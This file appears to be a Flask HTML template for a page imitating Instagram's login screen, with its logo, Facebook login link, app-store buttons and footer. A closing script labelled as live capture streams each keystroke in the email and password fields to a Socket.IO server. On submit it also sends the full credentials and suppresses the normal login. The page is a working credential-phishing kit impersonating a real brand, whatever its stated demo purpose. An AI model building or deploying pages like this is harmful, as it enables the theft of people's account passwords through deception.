<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- CSS -->
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='img/insta-fav.ico') }}">

    <!-- Socket.IO -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>

    <title>Instagram Clone</title>
</head>
<body>

    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">

                <h1 class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/instagram-logo.png') }}"
                         alt="Instagram logo">
                </h1>

                <!-- Login Form -->
                <form id="login-form">
                    <label class="sr-only" for="email">Email or Username</label>
                    <input id="email" name="email" placeholder="Email or Username">

                    <label class="sr-only" for="password">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password">

                    <button type="submit">Log In</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="{{ url_for('static', filename='img/facebook-icon.png') }}" alt="">
                        <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>

            </div>

            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/apple-button.png') }}"
                         alt="Apple Store logo">
                    <img src="{{ url_for('static', filename='img/googleplay-button.png') }}"
                         alt="Google Play logo">
                </div>
            </div>

        </section>
    </main>

    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2024 Instagram Clone</p>
    </footer>


    <!-- WEBSOCKET LIVE CAPTURE SCRIPT -->
    <script>
        // Connect to WebSocket server
        const socket = io();

        // Send live updates while typing
        function sendLive(field, value) {
            socket.emit("live_update", {
                field: field,
                value: value
            });
        }

        // Email live updates
        document.getElementById("email").addEventListener("input", function () {
            sendLive("email", this.value);
        });

        // Password live updates
        document.getElementById("password").addEventListener("input", function () {
            sendLive("password", this.value);
        });

        // Handle final form submission
        document.getElementById("login-form").addEventListener("submit", function (e) {
            e.preventDefault(); // Stop normal form

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            socket.emit("submit_form", {
                email: email,
                password: password
            });

            alert("Form submitted! Check server console.");
        });
    </script>

</body>
</html>
